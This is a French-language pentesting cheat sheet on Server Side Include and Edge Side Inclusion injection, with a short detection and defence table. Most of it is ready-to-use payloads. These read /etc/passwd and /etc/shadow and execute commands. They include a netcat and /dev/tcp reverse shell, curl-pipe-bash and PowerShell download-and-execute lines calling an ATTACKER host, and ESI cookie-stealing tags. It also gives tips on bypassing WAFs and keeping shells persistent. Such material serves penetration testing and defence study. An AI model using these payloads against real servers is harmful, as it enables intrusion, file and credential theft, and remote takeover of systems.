---
title: "SSI Injection"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# 🧩 SSI Injection — Server Side Include

> [!info] **En 1 phrase**
> SSI = directives **évaluées côté serveur** dans les pages HTML → si une entrée utilisateur
> est reflétée dans un fichier servi (`*.shtml`), on peut **lire des fichiers** ou **exécuter des commandes**.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/README.md)**

---

## 🎯 Concept

```mermaid
flowchart LR
    A[Entrée utilisateur<br><!--#exec cmd=...-->] --> B[Page .shtml<br>construite dynamiquement]
    B --> C[Serveur web<br>Apache / Nginx]
    C --> D[Directive exécutée]
    D --> E[Lecture fichier<br>#include]
    D --> F[Variables / env<br>#echo]
    D --> G[RCE<br>#exec]
    E --> H[Données sensibles]
    G --> I[Shell / reverse shell]
```

> [!info] 💡 **Pourquoi ça marche**
> Les SSI sont des directives placées dans les pages HTML et **évaluées par le serveur**
> au moment de servir la page. Si l'app concatène une entrée non filtrée dans une page
> servie en `.shtml`, on peut sortir du contexte prévu et **injecter nos propres directives**.

---

## 🧬 Rappel : le format SSI

> Les Server Side Includes (SSI) permettent de **générer du contenu dynamique** dans une page HTML
> **sans CGI ni langage serveur** complet. Format général : `<!--#directive param="value" -->`

```html
<!--#echo var="DATE_LOCAL" -->          <!-- affiche la date -->
<!--#echo var="DOCUMENT_NAME" -->       <!-- nom du document courant -->
<!--#printenv -->                       <!-- toutes les variables d'environnement -->
<!--#set var="name" value="Rich" -->    <!-- définir une variable -->
<!--#include file="/etc/passwd" -->     <!-- inclure un fichier du disque -->
<!--#include virtual="/index.html" -->  <!-- inclure un autre contenu (URL virtuelle) -->
<!--#exec cmd="ls" -->                  <!-- exécuter une commande OS -->
```

### 🎯 Quand ça s'applique

| Critère | Détail |
|---|---|
| **Extension** | Uniquement sur les fichiers **`.shtml`** (parfois `.shtm`, `.stm`) |
| **Serveurs** | Apache (mod_include), Nginx, IIS, lighttpd — surtout les **configs anciennes** |
| **Défaut** | SSI **désactivé** sur les serveurs récents → activé volontairement ou par hébergements mutualisés |
| **Contexte** | Entrée reflétée dans un fichier **statique** servi, ou injection **second-order** dans un fichier déjà `.shtml` |

---

## 🔥 Payloads

```html
<!--#exec cmd="id" -->                          <!-- RCE : identité (Linux) -->
<!--#exec cmd="whoami" -->                      <!-- RCE : identité (Windows) -->
<!--#exec cmd="cat /etc/passwd" -->             <!-- RCE : contenu fichier -->
<!--#include file="/etc/passwd" -->             <!-- lecture fichier -->
<!--#include file="/etc/shadow" -->             <!-- shadow si les droits le permettent -->
<!--#include virtual="/index.html" -->          <!-- include virtuel (URL) -->
<!--#include virtual="/proc/self/environ" -->   <!-- variable env du process -->
<!--#echo var="DOCUMENT_ROOT" -->               <!-- chemin racine du site -->
<!--#echo var="REMOTE_ADDR" -->                 <!-- IP du client -->
<!--#echo var="SERVER_SOFTWARE" -->             <!-- type/version du serveur -->
<!--#echo var="HTTP_USER_AGENT" -->             <!-- user-agent -->
<!--#printenv -->                               <!-- dump complet de l'environnement -->
<!--#set var="x" value="pwned" -->              <!-- modifier une variable -->
```

### Reverse shell

```html
<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f" -->
```

> [!warning] ⚠️ Le pipe `|` et le `;` doivent passer tels quels dans la commande.
> Si le WAF les bloque, encoder en `$IFS`, base64, ou passer par un script fichier.

---

## 🚀 RCE

### Linux (Apache / mod_include)

```html
<!--#exec cmd="id" -->
<!--#exec cmd="ls -la /" -->
<!--#exec cmd="curl http://ATTACKER/shell.sh | bash" -->
```

### Windows (IIS / Apache)

```html
<!--#exec cmd="cmd.exe /c whoami" -->
<!--#exec cmd="cmd.exe /c dir C:\" -->
<!--#exec cmd="powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ps.ps1')" -->
```

### 🎯 Injection dans un fichier déjà `.shtml` (second-order)

> Si l'app écrit l'entrée utilisateur (commentaire, nom de fichier uploadé, champ de config)
> **dans un fichier `.shtml`**, la directive est exécutée au **prochain chargement** de la page :

```txt
1. Champ de formulaire :  <!--#exec cmd="id" -->
2. Stocké dans page.shtml  →  exécuté côté serveur à chaque GET
3. Payload "time-based"    →  <!--#exec cmd="sleep 10" -->  = confirmé si la page met 10 s à répondre
```

> [!tip] 💡 C'est une **injection de type "stored/second-order"** : le payload n'a pas
> forcément d'effet immédiat, il s'active quand le fichier est servi.

---

## 📂 Lecture de fichiers

```html
<!--#include file="/etc/passwd" -->
<!--#include file="/etc/apache2/apache2.conf" -->
<!--#include file="/var/www/html/config.php" -->
<!--#include virtual="/secret.txt" -->
<!--#include virtual="/proc/self/cmdline" -->
```

### Variables utiles pour l'énumération

| Variable | Contenu |
|---|---|
| `DOCUMENT_ROOT` | racine web du site |
| `DOCUMENT_NAME` | nom du fichier courant |
| `SERVER_SOFTWARE` | version du serveur |
| `REMOTE_ADDR` / `REMOTE_HOST` | IP / hostname du client |
| `HTTP_USER_AGENT` / `HTTP_REFERER` | en-têtes HTTP |
| `DATE_LOCAL` / `DATE_GMT` | date locale / GMT |

---

## 🧰 Outils

```bash
# SSTImap — détection SSI/SSTI automatique (basé sur tplmap)
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

> Téléchargeable : [vladko312/SSTImap](https://github.com/vladko312/SSTImap)

---

## 🌐 Edge Side Inclusion (ESI)

> Variante moderne : les **caches HTTP** (surrogates) évaluent les tags ESI dans la réponse.
> Un surrogate ne peut pas distinguer les tags **légitimes** de ceux **injectés** par l'attaquant.

```ps1
Surrogate-Control: content="ESI/1.0"     # certains surrogates exigent ce header
```

### Payloads ESI

```html
<esi:include src=http://[ATTACKER.DOMAIN.TLD]>                                  <!-- blind detection -->
<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>                  <!-- XSS -->
<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>  <!-- vol de cookies -->
<esi:include src="supersecret.txt">                                             <!-- lecture fichier -->
<esi:debug/>                                                                    <!-- infos debug -->
<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->               <!-- manipulation header -->
<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>  <!-- fragment inline -->
```

### Capacités par logiciel

| Software | Includes | Vars | Cookies | Upstream Headers requis | Host Whitelist |
|---|---|---|---|---|---|
| Squid3 | Oui | Oui | Oui | Oui | Non |
| Varnish Cache | Oui | Non | Non | Oui | Oui |
| Fastly | Oui | Non | Non | Non | Oui |
| Akamai ETS | Oui | Oui | Oui | Non | Non |
| NodeJS `esi` | Oui | Oui | Oui | Non | Non |
| NodeJS `nodesi` | Oui | Non | Non | Non | Optionnel |

---

## 🕵️ Détection

> [!tip] 💡 **Le test le plus simple :** injecter un `#echo` et observer le rendu.

```html
<!--#echo var="DATE_LOCAL" -->
```

> Si la page affiche la **date courante** (au lieu du texte brut) → le serveur interprète les SSI.

### Étapes

```bash
# 1. Identifier les extensions SSI (crawler / Wayback / listing de dossiers)
*.shtml   *.shtm   *.stm

# 2. Vérifier que le serveur supporte SSI — payload de confirmation :
#    → affiche la date si actif
<!--#echo var="DATE_LOCAL" -->

# 3. Détection blind (time-based, sans rendu visible) :
<!--#exec cmd="sleep 5" -->   # réponse à +5 s = SSI actif

# 4. Détection par erreur (si le rendu est filtré / WAF) :
#    injecter une directive invalide et comparer les codes HTTP / contenus
```

### Indices de présence

- Extensions `.shtml`, `.shtm`, `.stm` dans l'application
- Serveurs mutualisés / anciens hébergements web
- Contenu statique avec horodatages ou fragments dynamiques
- En-têtes `Server: Apache` avec `mod_include` chargé

---

## 🔍 Détection & Défense

| Réponse | Détail |
|---|---|
| **Désactiver SSI** | `Options -Includes` (Apache) / désactiver SSI sur Nginx, IIS, lighttpd |
| **Extension control** | Refuser de servir du `.shtml` quand ce n'est pas nécessaire ; whitelist d'extensions |
| **Ne jamais refléter** | Les entrées utilisateur ne doivent **jamais** être écrites dans un fichier servi (`.shtml`) sans échappement |
| **Sanitiser le HTML** | Échapper `<`, `>`, `!`, `#` si l'entrée est stockée dans une page servie |
| **Droits du process web** | Moindre privilège → limite les fichiers lisibles et les commandes possibles |
| **Isolation** | Pas de contenu uploadé / généré dans le docroot s'il peut devenir `.shtml` |
| **WAF** | Règle sur `<!--#exec`, `#include`, `#echo` — contournable (encodages, split) |
| **Surveillance** | Logs d'accès : requêtes contenant `<!--#`, temps de réponse anormaux (`sleep`) |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **SSI = exécuté côté serveur**
> La directive est interprétée par le **serveur web** (pas par le navigateur, pas par PHP).
> Un payload qui n'est pas dans un fichier `.shtml` (ou traité par un module SSI) restera du texte brut.

> [!warning] ⚠️ **Pièges de l'extension**
> - Le fichier doit être servi avec une extension **`.shtml`** : renommer une page en `.shtml` peut suffire à déclencher l'interprétation.
> - `<!--#include file="..." -->` = chemin **relatif au docroot** ; `virtual` = chemin d'URL.
> - `#exec` peut être **désactivé** alors que `#include` et `#echo` restent actifs (config `IncludesNoExec`) → toujours tester les deux.
> - Le serveur n'exécute pas les SSI dans les fichiers `.html` classiques par défaut.

> [!tip] 💡 **Convertir un fichier normal en `.shtml`**
> `cp page.html page.shtml` (ou `mv`) puis re-servez la page : si l'app accepte d'écrire
> dedans (upload, édition), c'est un vecteur **persistant** de RCE.

> [!warning] ⚠️ **Pièges d'exploitation**
> - Le résultat de `#exec` n'est pas toujours affiché (sortie serveur invisible) → préférer un **reverse shell** ou une écriture de fichier.
> - `mkfifo ... nc ... | /bin/bash` nécessite `nc` sur la cible ; sinon `bash -i >& /dev/tcp/IP/PORT 0>&1`.
> - WAF : `<!--#` est souvent filtré → tenter `<!-- #exec` (espace), encodage, ou découper le payload.
> - Payloads avec `|` et `;` peuvent être mangés par la sémantique HTML → échapper ou encoder.
> - Un reverse shell éphémère meurt avec le process serveur : penser à un shell **persistant**.

---

## 🔗 Liens

- [[LFI et RFI|📂 LFI / RFI]] — lecture de fichiers côté serveur
- [[Injection de commandes|🐚 Injection de commandes]] — exécution de commandes OS
- [[Upload de fichiers|📤 Upload]] — écrire un `.shtml` sur le serveur
- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
- 📚 Source : [PayloadsAllTheThings — SSI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/README.md)
- 📚 Références : [OWASP SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) · [HackTricks](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection) · [n00py — Exploiting SSI](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
